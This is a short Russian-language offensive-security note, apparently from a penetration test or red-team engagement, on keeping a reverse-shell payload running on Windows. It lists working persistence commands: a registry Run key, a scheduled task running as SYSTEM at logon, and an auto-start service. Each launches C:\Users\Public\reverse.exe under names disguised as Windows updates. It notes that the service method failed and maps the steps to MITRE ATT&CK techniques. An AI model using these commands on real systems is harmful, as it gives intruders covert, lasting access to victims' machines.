# Закрепление (Persistence)

## Реверс-шелл и автозапуск (Windows)

**Цель:** Обеспечить повторный запуск полезной нагрузки.

### Методы:
1. **Реестр (HKCU Run):**
   `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateService /t REG_SZ /d "C:\Users\Public\reverse.exe" /f`
2. **Планировщик задач (от SYSTEM):**
   `schtasks /create /tn "WinUpdate" /tr "C:\Users\Public\reverse.exe" /sc onlogon /ru System`
3. **Служба Windows:**
   `sc.exe create WinUp binPath="C:\Users\Public\reverse.exe" start=auto` (не запустилась, ошибка 1053).

**MITRE ATT&CK:** T1547.001, T1053.005.
